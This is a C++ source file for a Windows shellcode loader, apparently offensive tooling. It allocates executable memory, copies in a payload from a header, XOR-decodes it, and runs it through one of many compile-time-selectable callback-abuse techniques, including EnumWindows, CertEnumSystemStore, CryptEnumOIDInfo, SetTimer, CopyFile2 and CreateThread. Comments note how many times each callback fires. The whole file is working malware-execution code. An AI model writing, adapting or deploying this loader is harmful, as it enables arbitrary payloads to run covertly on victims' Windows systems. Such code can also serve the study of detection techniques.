#ifdef PAYLOAD
#include "payload.h"
#include <stdio.h>
#include <string>
#include <windows.h>

#ifdef ENC_XOR
void memxor(unsigned char* mem, std::wstring key, int size) {
    for (int i = 0; i < size ; ++i) {
        mem[i] ^= key[i % key.length()];
    }
}
#endif

int entry(int argc, char** argv) {
    LPVOID scAddr = 0;

    // Allocate memory
#ifdef ALLOC_HEAP
    HANDLE hndl = HeapCreate(
        HEAP_CREATE_ENABLE_EXECUTE, 0, sizeof(sc)
    );
    scAddr = HeapAlloc(hndl, HEAP_ZERO_MEMORY, sizeof(sc));
    if (hndl) CloseHandle(hndl);
#elifdef ALLOC_STACK
    scAddr = VirtualAlloc(
        0, sizeof(sc), MEM_COMMIT, PAGE_EXECUTE_READWRITE
    );
#else
    printf("Unsupported ALLOC provided at compile time\n");
    exit(1);
#endif

    // Check for successful allocation
    if (scAddr == 0) {
        printf("Failed to allocate memory\n");
        exit(2);
    }

    // Copy shellcode to memory
    memcpy(scAddr, sc, sizeof(sc));

#ifdef ENC_XOR
    if (sckey.length() > 0) {
        // Decode our shellcode in memory byte by byte
        memxor((unsigned char*)scAddr, sckey, sizeof(sc));
    }
#else
    printf("Unsupported ENC provided at compile time\n");
    exit(3);
#endif

    // Run payload via callback
#ifdef EXEC_CERTENUMSYSTEMSTORE
    // NOTE: potentially dangerous, runs numerous times
    /* #include <wincrypt.h> */
    typedef bool (__cdecl* MYPROC)(DWORD, void*, void*, void*);

    HMODULE lib = LoadLibrary("Crypt32.dll");
    if (lib != NULL) {
        MYPROC CertEnumSystemStore = (MYPROC) GetProcAddress(
            lib, "CertEnumSystemStore"
        );
        if (CertEnumSystemStore != NULL) {
            CertEnumSystemStore(
                CERT_SYSTEM_STORE_CURRENT_SERVICE, // ok choice ~9x
                // CERT_SYSTEM_STORE_CURRENT_USER, // meh ~13x
                // ok choice ~9x
                // CERT_SYSTEM_STORE_CURRENT_USER_GROUP_POLICY,
                // CERT_SYSTEM_STORE_LOCAL_MACHINE, // NO! DANGEROUS!
                // meh ~13x
                // CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE,
                // meh ~12x
                // CERT_SYSTEM_STORE_LOCAL_MACHINE_GROUP_POLICY,
                // CERT_SYSTEM_STORE_SERVICES, // Nothing here
                // CERT_SYSTEM_STORE_USERS, // meh ~11x
                0,
                0,
                scAddr
            );
        }
    }
#elifdef EXEC_COPYFILE2
    COPYFILE2_EXTENDED_PARAMETERS params;

    params.dwCopyFlags = COPY_FILE_FAIL_IF_EXISTS;
    params.dwSize = {sizeof(params)};
    params.pfCancel = FALSE;
    params.pProgressRoutine = (PCOPYFILE2_PROGRESS_ROUTINE)scAddr;
    params.pvCallbackContext = nullptr;

    DeleteFileW(L"C:\\Windows\\Temp\\backup.log");
    CopyFile2(
        L"C:\\Windows\\DirectX.log",
        L"C:\\Windows\\Temp\\backup.log",
        &params
    );
#elifdef EXEC_CRYPTENUMOIDINFO
    // NOTE: potentially dangerous, runs numerous times
    /* #include <wincrypt.h> */
    typedef bool (__cdecl* MYPROC)(DWORD, DWORD, void*, void*);

    HMODULE lib = LoadLibrary("Crypt32.dll");
    if (lib != NULL) {
        MYPROC CryptEnumOIDInfo = (MYPROC) GetProcAddress(
            lib, "CryptEnumOIDInfo"
        );
        if (CryptEnumOIDInfo != NULL) {
            CryptEnumOIDInfo(
                // CRYPT_ENCRYPT_ALG_OID_GROUP_ID, // Too many
                // CRYPT_ENHKEY_USAGE_OID_GROUP_ID, // NO! DANGEROUS!
                // CRYPT_EXT_OR_ATTR_OID_GROUP_ID, // NO! DANGEROUS!
                // CRYPT_FIRST_ALG_OID_GROUP_ID, // Too many
                // CRYPT_HASH_ALG_OID_GROUP_ID, // Too many
                CRYPT_KDF_OID_GROUP_ID, // Good choice ~3x
                // CRYPT_LAST_ALG_OID_GROUP_ID, // NO! DANGEROUS!
                // CRYPT_LAST_OID_GROUP_ID, // Good choice ~3x
                // CRYPT_POLICY_OID_GROUP_ID, // Ok choice ~6x
                // CRYPT_PUBKEY_ALG_OID_GROUP_ID, // NO! DANGEROUS!
                // CRYPT_RDN_ATTR_OID_GROUP_ID, // NO! DANGEROUS!
                // CRYPT_SIGN_ALG_OID_GROUP_ID, // NO! DANGEROUS!
                // CRYPT_TEMPLATE_OID_GROUP_ID, // Nothing here
                0,
                0,
                scAddr
            );
        }
    }
#elifdef EXEC_ENUMCALENDARINFO
    EnumCalendarInfoExEx(
        (CALINFO_ENUMPROCEXEX)scAddr,
        LOCALE_NAME_INVARIANT,
        ENUM_ALL_CALENDARS,
        0,
        CAL_SMONTHNAME1,
        0
    );
#elifdef EXEC_ENUMDISPLAYMONITORS
    EnumDisplayMonitors(0, 0, (MONITORENUMPROC)scAddr, 0);
#elifdef EXEC_ENUMPWRSCHEMES
    /* #include <powrprof.h> */
    typedef bool (__cdecl* MYPROC)(void*, void*);

    HMODULE lib = LoadLibrary("PowrProf.dll");
    if (lib != NULL) {
        MYPROC EnumPwrSchemes = (MYPROC) GetProcAddress(
            lib, "EnumPwrSchemes"
        );
        if (EnumPwrSchemes != NULL) {
            EnumPwrSchemes(scAddr, 0);
        }
    }
#elifdef EXEC_ENUMPROPS
    // NOTE: runs payload twice
    EnumPropsW(GetTopWindow(0), (PROPENUMPROCW)scAddr);
#elifdef EXEC_ENUMWINDOWS
    // NOTE: dangerous, runs payload NUMEROUS times
    EnumWindows((WNDENUMPROC)scAddr, 0);
#elifdef EXEC_SETTIMER
    MSG msg;
    SetTimer(0, 0, 0, (TIMERPROC)scAddr);
    GetMessageW(&msg, 0, 0, 0);
    DispatchMessageW(&msg);
#elifdef EXEC_THREAD
    HANDLE t = CreateThread(
        0, 0, (LPTHREAD_START_ROUTINE)scAddr, 0, 0, 0
    );
    WaitForSingleObject(t, INFINITE);
    if (t) CloseHandle(t);
#else
    printf("Unsuported EXEC provided at compile time\n");
    exit(4);
#endif

    return 0;
}
#else
#include <stdio.h>

int entry(int argc, char** argv) {
    printf("You fool...\n");
    return 0;
}
#endif
